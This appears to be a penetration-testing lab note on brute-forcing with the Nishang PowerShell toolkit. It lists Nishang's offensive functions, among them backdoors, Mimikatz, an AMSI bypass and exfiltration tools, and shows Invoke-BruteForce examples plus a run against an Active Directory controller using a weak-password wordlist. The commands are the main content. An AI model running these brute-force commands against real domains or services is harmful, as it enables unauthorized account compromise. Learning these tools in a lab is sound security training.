#### 43. Bruteforce Part 1

###### Brute-Forcing

- Brute-Force in Nishang:
    - Active Directory
    - FTP
    - MSSQL Server
    - Sharepoint
- Attacking machine must be a part of the domain

```PowerShell
PS C:\> Enter-PSSession -ComputerName WIN-2012-DC -Credential PFPT\Administrator
```

```PowerShell
[win-2012-dc]: PS C:\Users\Administrator\Documents> cd ..
[win-2012-dc]: PS C:\Users\Administrator> cd .\Desktop
[win-2012-dc]: PS C:\Users\Administrator\Desktop> cd .\nishang-master
[win-2012-dc]: PS C:\Users\Administrator\Desktop\nishang-master> Import-Module .\nishang.psm1
WARNING: The names of some imported commands from the module 'nishang' include unapproved verbs that might make them less discoverable. To find the commands with unapproved
verbs, run the Import-Module command again with the Verbose parameter. For a list of approved verbs, type Get-Verb.
WARNING: Some imported command names contain one or more of the following restricted characters: # , ( ) {{ }} [ ] & - / \ $ ^ ; : " ' < > | ? @ ` * % + = ~
[win-2012-dc]: PS C:\Users\Administrator\Desktop\nishang-master>
```

```PowerShell
[win-2012-dc]: PS C:\Users\Administrator\Desktop\nishang-master> Get-Command -Module nishang

CommandType     Name                                               ModuleName
-----------     ----                                               ----------
Function        Add-Exfiltration                                   nishang
Function        Add-Persistence                                    nishang
Function        Add-RegBackdoor                                    nishang
Function        Add-ScrnSaveBackdoor                               nishang
Function        Base64ToString                                     nishang
Function        Check-VM                                           nishang
Function        ConvertTo-ROT13                                    nishang
Function        Copy-VSS                                           nishang
Function        Create-MultipleSessions                            nishang
Function        DNS_TXT_Pwnage                                     nishang
Function        Do-Exfiltration                                    nishang
Function        Download                                           nishang
Function        Download_Execute                                   nishang
Function        Download-Execute-PS                                nishang
Function        Enable-DuplicateToken                              nishang
Function        Execute-Command-MSSQL                              nishang
Function        Execute-DNSTXT-Code                                nishang
Function        Execute-OnTime                                     nishang
Function        ExetoText                                          nishang
Function        FireBuster                                         nishang
Function        FireListener                                       nishang
Function        Get-Information                                    nishang
Function        Get-LsaSecret                                      nishang
Function        Get-PassHashes                                     nishang
Function        Get-PassHints                                      nishang
Function        Get-Unconstrained                                  nishang
Function        Get-WebCredentials                                 nishang
Function        Get-Wlan-Keys                                      nishang
Function        Get-WmiShellOutput                                 nishang
Function        Gupt-Backdoor                                      nishang
Function        HTTP-Backdoor                                      nishang
Function        Invoke-ADSBackdoor                                 nishang
Function        Invoke-AmsiBypass                                  nishang
Function        Invoke-BruteForce                                  nishang
Function        Invoke-CredentialsPhish                            nishang
Function        Invoke-Decode                                      nishang
Function        Invoke-Encode                                      nishang
Function        Invoke-Interceptor                                 nishang
Function        Invoke-JSRatRegsvr                                 nishang
Function        Invoke-JSRatRundll                                 nishang
Function        Invoke-Mimikatz                                    nishang
Function        Invoke-MimikatzWDigestDowngrade                    nishang
Function        Invoke-Mimikittenz                                 nishang
Function        Invoke-NetworkRelay                                nishang
Function        Invoke-PortScan                                    nishang
Function        Invoke-PoshRatHttp                                 nishang
Function        Invoke-PoshRatHttps                                nishang
Function        Invoke-PowerShellIcmp                              nishang
Function        Invoke-PowerShellTcp                               nishang
Function        Invoke-PowerShellUdp                               nishang
Function        Invoke-PowerShellWmi                               nishang
Function        Invoke-Prasadhak                                   nishang
Function        Invoke-PSGcat                                      nishang
Function        Invoke-PsGcatAgent                                 nishang
Function        Invoke-PsUACme                                     nishang
Function        Invoke-SSIDExfil                                   nishang
Function        Out-CHM                                            nishang
Function        Out-DnsTxt                                         nishang
Function        Out-Excel                                          nishang
Function        Out-HTA                                            nishang
Function        Out-Java                                           nishang
Function        Out-JS                                             nishang
Function        Out-RundllCommand                                  nishang
Function        Out-SCF                                            nishang
Function        Out-SCT                                            nishang
Function        Out-Shortcut                                       nishang
Function        Out-WebQuery                                       nishang
Function        Out-Word                                           nishang
Function        Parse_Keys                                         nishang
Function        Remove-Persistence                                 nishang
Function        Remove-PoshRat                                     nishang
Function        Remove-Update                                      nishang
Function        Run-EXEonRemote                                    nishang
Function        Show-TargetScreen                                  nishang
Function        Speak                                              nishang
Function        Start-CaptureServer                                nishang
Function        StringtoBase64                                     nishang
Function        TexttoEXE                                          nishang

[win-2012-dc]: PS C:\Users\Administrator\Desktop\nishang-master>
```

```PowerShell
[win-2012-dc]: PS C:\Users\Administrator\Desktop\nishang-master> Get-Help Invoke-BruteForce -Examples

NAME
    Invoke-BruteForce

SYNOPSIS
    Nishang payload which performs a Brute-Force Attack against SQL Server, Active Directory, Web and FTP.

    -------------------------- EXAMPLE 1 --------------------------

    PS >Invoke-BruteForce -ComputerName SQLServ01 -UserList C:\test\users.txt -PasswordList C:\test\wordlist.txt -Service SQL -Verbose


    Brute force a SQL Server SQLServ01 for users listed in users.txt and passwords in wordlist.txt




    -------------------------- EXAMPLE 2 --------------------------

    PS >Invoke-BruteForce -ComputerName targetdomain.com -UserList C:\test\users.txt -PasswordList C:\test\wordlist.txt -Service ActiveDirectory -StopOnSuccess -Verbose


    Brute force a Domain Controller of targetdomain.com for users listed in users.txt and passwords in wordlist.txt.
    Since StopOnSuccess is specified, the brute forcing stops on first success.




    -------------------------- EXAMPLE 3 --------------------------

    PS >cat C:\test\servers.txt | Invoke-BruteForce -UserList C:\test\users.txt -PasswordList C:\test\wordlist.txt -Service SQL -Verbose


    Brute force SQL Service on all the servers specified in servers.txt


[win-2012-dc]: PS C:\Users\Administrator\Desktop\nishang-master>
```

```PowerShell
[win-2012-dc]: PS C:\Users\Administrator\Desktop\nishang-master> Invoke-BruteForce -ComputerName WIN-2012-DC -UserList ..\user.txt -PasswordList ..\500-worst-passwords.txt -Service ActiveDirectory
Brute Forcing Active Directory WIN-2012-DC
[win-2012-dc]: PS C:\Users\Administrator\Desktop\nishang-master>
```
